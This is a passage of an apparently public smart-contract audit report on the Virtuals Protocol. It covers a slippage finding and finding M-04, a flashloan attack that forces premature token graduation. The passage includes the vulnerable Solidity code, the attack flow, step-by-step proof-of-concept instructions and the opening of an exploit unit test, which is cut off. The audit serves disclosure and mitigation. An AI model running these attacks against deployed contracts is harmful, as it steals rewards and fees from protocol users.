style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eI think there are more than one considerations to make here.\u003c/p\u003e\n\u003cp\u003eGiven that the purpose of one of these functions \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e is executing many swaps in a loop, setting a single slippage protection inside the call could be not ideal, as the transactions run one after the other; and if the last one hits slippage, all of them get a revert (but could be chosen if that behaviour is desired).\u003c/p\u003e\n\u003cp\u003eAlso, the other of the mentioned functions (\u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e) is meant to be called by another contract at execution (\u003ccode\u003eFRouter::buy\u003c/code\u003e and \u003ccode\u003eFRouter::sell\u003c/code\u003e, to handle fees), thus passing slippage protection parameters as an argument might be difficult.\u003c/p\u003e\n\u003cp\u003eSome solutions could be:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFor \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e, use a current starting price associated with a \u003ccode\u003eTaxToken\u003c/code\u003e at which execution of swap is acceptable to pass as an argument, and revert if it isn’t met.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eTo get the current price at execution time, \u003ccode\u003eIUniswapV2Router01::getAmountsOut\u003c/code\u003e could be used, passing a reference value as amount, and then calculating the price from it and the value returned, to compare it with the argument and check slippage.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"43\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cul\u003e\n\u003cli\u003e\n\u003cp\u003eFor \u003ccode\u003eBondingTax::swapForAsset\u003c/code\u003e:\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eIf the calls inside \u003ccode\u003eFRouter::buy\u003c/code\u003e and \u003ccode\u003eFRouter::sell\u003c/code\u003e could be removed, the implementation could also be similar as that suggested for \u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e. \u003c/li\u003e\n\u003cli\u003eOtherwise, you could set in the contract a minimum acceptable price (or a series of them, if you were to implement many \u003ccode\u003etaxTokens\u003c/code\u003e, for both contracts) in which you would consider more important to avoid the slippage lose than having the swap fail in the try-catch.\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch3 id=\"proof-of-concept-6\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eBondingTax::SwapForAsset\u003c/code\u003e is called by the bondingRouter, to swap a \u003ccode\u003etaxToken\u003c/code\u003e for the \u003ccode\u003eAssetToken\u003c/code\u003e.\u003c/li\u003e\n\u003cli\u003eSomeone makes a very big swap exactly before the call in relevant pool.\u003c/li\u003e\n\u003cli\u003eThe call executes.\u003c/li\u003e\n\u003cli\u003eWe swapped fees cheaply.\u003c/li\u003e\n\u003cli\u003eAfter our swap the price gets a correction rather quickly to its average, but we already made the swap at a disadvantageous price.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eAnd in the other case:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e\u003ccode\u003eAgentTax::DcaSell\u003c/code\u003e is called to process taxes.\u003c/li\u003e\n\u003cli\u003eSomeone makes a very big swap exactly before the call in relevant pool.\u003c/li\u003e\n\u003cli\u003eSince slippage protection intends to be calculated at run-time, it never hits, even though the price could have dropped very significantly. So our call executes.\u003c/li\u003e\n\u003cli\u003eSwaps are performed successfully, and the protocol and the creators of agents would lose a significant part of their fees.\u003c/li\u003e\n\u003c/ol\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\" style=\"position:relative;\"\u003e\u003ca href=\"#m-04-launched-tokens-are-vulnerable-to-flashloan-attacks-forcing-premature-graduation-allowing-reward-manipulation\" aria-label=\"m 04 launched tokens are vulnerable to flashloan attacks forcing premature graduation allowing reward manipulation permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-12\"\u003e[M-04] Launched tokens are vulnerable to flashloan attacks forcing premature graduation, allowing reward manipulation\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-246\"\u003eoakcobalt\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-20\"\u003embuba666\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eBonding.sol only allows a launched memecoin to graduate when \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L350\"\u003e\u003ccode\u003egradThreshold\u003c/code\u003e\u003c/a\u003e is met and enough liquidity (\u003ccode\u003eassetToken\u003c/code\u003e balance) is gained through the investor community trading. This ensures the price stability of the \u003ccode\u003eagentToken\u003c/code\u003e upon graduation.\u003c/p\u003e\n\u003cp\u003eThe vulnerability is that current implementation allows the investor community trading to be bypassed by flashloan attack. A malicious founder or founder controlled account can force graduate a token with a flashloan and gain exposure to reward emissions.\u003c/p\u003e\n\u003cp\u003eThe key attack vector: \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L318\"\u003e\u003ccode\u003ebuy()\u003c/code\u003e\u003c/a\u003e memecoin with flashloaned virtual tokens (e.g. from already deployed uniswapV2pairs or other pools with virtual) → sell atomically in newly deployed uniswapV2pair. This forces graduation of a freshly deployed memecoin with no community support.\u003c/p\u003e\n\u003cp\u003eThe key vulnerable code that enable the attack is \u003ccode\u003eupwrapToken()\u003c/code\u003e which allows converting memecoins to \u003ccode\u003eagentTokens\u003c/code\u003e do not have any time-based restrictions, allowing atomic unwrap upon graduation. A flashloan loop can be closed atomically through \u003ccode\u003eunwrapToken\u003c/code\u003e.\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e//contracts/fun/Bonding.sol\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eunwrapToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenInfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003erequire\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etradingOnUniswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Token is not graduated yet\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eFERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003einfo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003esrcTokenAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassetToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e());\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003elength\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaccounts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etoken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eburnFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e|\u0026gt;              \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransferFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eacc\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebalance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003cspan class=\"mtk3\"\u003e//@audit no time restrictions, unwrapToken allows atomic agentToken conversion upon graduation\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417\"\u003ehttps://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/fun/Bonding.sol#L416-L417\u003c/a\u003e\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"45\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eFlows: flashswap/flashloan -\u0026gt; bonding::buy -\u0026gt; bonding::unwrapToken -\u0026gt; uniswapV2router::swapExactTokensForETHSupportingFeeOnTransferTokens -\u0026gt; paypack flashswap/flashloan\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"impact-5\" style=\"position:relative;\"\u003e\u003ca href=\"#impact-5\" aria-label=\"impact 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eImpact\u003c/h3\u003e\n\u003col\u003e\n\u003cli\u003e\u003cstrong\u003ePremature graduation:\u003c/strong\u003e allowing easy price manipulation through flashloan that bypass community support and liquidity. \u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eReward distribution is manipulated:\u003c/strong\u003e forced graduated token will have Lp values (\u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/084a1b46749e2a9924ecc8c06982a40cc8b3dd5a/contracts/AgentRewardV3.sol#L110\"\u003e\u003ccode\u003egetLPValue()\u003c/code\u003e\u003c/a\u003e) and eligible for reward shares, reducing other legitimate \u003ccode\u003eagentToken\u003c/code\u003e rewards. Malicious founder gains rewards and dilute other \u003ccode\u003eagentToken\u003c/code\u003e’s rewards.\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eMarket manipulation:\u003c/strong\u003e the deployed uniswapV2pair through flash loan attack doesn’t have intended liquidity and agent token price stability because uniswapV2pair has unbalanced reserves.\u003c/li\u003e\n\u003c/ol\u003e\n\u003ch3 id=\"recommended-mitigation-steps-9\" style=\"position:relative;\"\u003e\u003ca href=\"#recommended-mitigation-steps-9\" aria-label=\"recommended mitigation steps 9 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eRecommended mitigation steps\u003c/h3\u003e\n\u003cp\u003eConsider enforcing a delay in \u003ccode\u003eupwrapToken\u003c/code\u003e such that flash loan cannot be closed atomically.\u003c/p\u003e\n\u003ch3 id=\"proof-of-concept-7\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-7\" aria-label=\"proof of concept 7 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cp\u003eSuppose founder launched Cat memcoin from bonding.sol. Attacker can be a founder or a founder controlled account.\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eAttacker takes out flashloan (virtual token).\u003c/li\u003e\n\u003cli\u003eAttacker uses flashloan to buy memecoin and trigger graduation.\u003c/li\u003e\n\u003cli\u003eUnwrap tokens to receive agent tokens.\u003c/li\u003e\n\u003cli\u003eTrade agent tokens for virtual tokens in Uniswap pair atomically.\u003c/li\u003e\n\u003cli\u003eAttacker paying back flashloan with traded out virtual tokens (only paying extra fees/tax in trading).\u003c/li\u003e\n\u003cli\u003eCheck that the uniswap LP tokens are automatically staked in veToken.\u003c/li\u003e\n\u003cli\u003eDelegate to self to be eligible for rewards.\u003c/li\u003e\n\u003cli\u003eDistribute rewards and verify forced graduated agent token receives allocation.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003eSee added unit test \u003ccode\u003eflash loan attack force premature graduation\u003c/code\u003e, manipulating rewards in \u003ccode\u003etest/bonding.js\u003c/code\u003e:\u003c/p\u003e\n\u003cdetails\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"46\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e  it.only(\u0026quot;flash loan attack force premature graduation, stealing rewards\u0026quot;, async function () {\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    this.timeout(120000); // 120 seconds\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Setup test environment\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { virtualToken, bonding, fRouter, agentFactory, agentNft } =\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      await loadFixture(deployBaseContracts);\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    const { founder, trader, treasury, deployer } = await getAccounts();\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Initial setup - founder launches a memecoin\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken.mint(founder.address, parseEther(\u0026quot;200\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await virtualToken\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .connect(founder)\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      .approve(bonding.target, parseEther(\u0026quot;1000\u0026quot;));\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    // Launch the token\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e    await bonding\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e      